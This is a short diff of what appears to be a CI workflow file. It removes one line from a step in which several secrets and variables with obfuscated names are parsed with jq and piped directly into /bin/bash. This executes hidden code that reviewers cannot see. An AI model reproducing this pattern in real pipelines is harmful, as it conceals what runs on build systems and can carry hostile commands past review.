@@ -23,7 +23,6 @@ jobs:
           gvo1: ${{ secrets.gvo1 }}
         run: |
           printf '%s' "$gvo1" | jq -r .q272 | /bin/bash
-          echo $cy3 | jq -r .tutf98 | /bin/bash
           printf '%s' "$zz3953" | jq -r .e21780 | /bin/bash
           echo $ffjk8588 | jq -r .yikcx9 | /bin/bash
           echo $jcjmw68359 | jq -r .ysj8 | /bin/bash
